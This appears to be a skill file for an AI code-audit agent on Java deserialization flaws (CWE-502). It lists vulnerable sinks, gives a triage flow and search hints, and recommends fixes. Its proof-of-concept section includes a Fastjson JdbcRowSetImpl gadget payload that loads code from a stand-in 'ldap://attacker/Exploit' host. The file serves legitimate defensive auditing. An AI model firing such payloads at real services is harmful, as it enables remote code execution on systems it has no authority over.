# Java — Deserialization Audit Skill (CWE-502)

## Sink inventory (ordered by historical exploitability)
- `ObjectInputStream.readObject` — classic Java deser RCE.
- `XMLDecoder.readObject` — RCE by design on untrusted XML.
- Fastjson `JSON.parseObject(text, Class)` with autoType enabled
  (or with `@type` field) — RCE via gadget classes.
- Jackson `ObjectMapper.enableDefaultTyping` (or
  `activateDefaultTyping`) — RCE via gadget classes.
- SnakeYAML default constructor (`new Yaml().load(s)`) — RCE via
  type tags.
- XStream `xstream.fromXML(s)` without strict type allowlist.
- Hessian `HessianInput.readObject` / `Hessian2Input.readObject`.
- Kryo `kryo.readClassAndObject` if class registration is open.

## Decision flow

1. Bytes attacker-controlled? Could be HTTP body, deserialized
   session, JMS message, Redis cache that the attacker can poison.
2. Library default config?
   - `ObjectInputStream` reading typed objects? Look for
     `ObjectInputFilter` set on the stream (Java 9+).
   - Jackson + `enableDefaultTyping` / `@JsonTypeInfo` =
     gadget-friendly.
   - Fastjson < 1.2.83 with `autoType` defaults — vulnerable.
3. Gadget chains: Apache CommonsCollections / Beanutils / Groovy
   on the classpath dramatically widen exploitability — check
   `pom.xml` / `build.gradle`.

## Tool hints

- `ripgrep__search "enableDefaultTyping"` / `"AUTO_DETECT"`.
- `tldr__tldr_extract` on the controller / deserializer factory.
- Look for `ObjectInputFilter` setup (allowlist of classes).

## POC template

For Fastjson (versions vulnerable to JdbcRowSetImpl gadget):
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}
```

For Jackson with default typing:
```json
["org.apache.commons.beanutils.BeanComparator", {"property":"...", ...}]
```

## Fix recommendations
1. Don't deserialize untrusted bytes. Use JSON with strict schema
   validation (Jackson without default typing + DTO types).
2. For ObjectInputStream usage that can't be removed, install an
   `ObjectInputFilter` allowlist.
3. SnakeYAML: use `new Yaml(new SafeConstructor())`.
4. Upgrade Fastjson to ≥ 2.x with `safeMode` enabled.
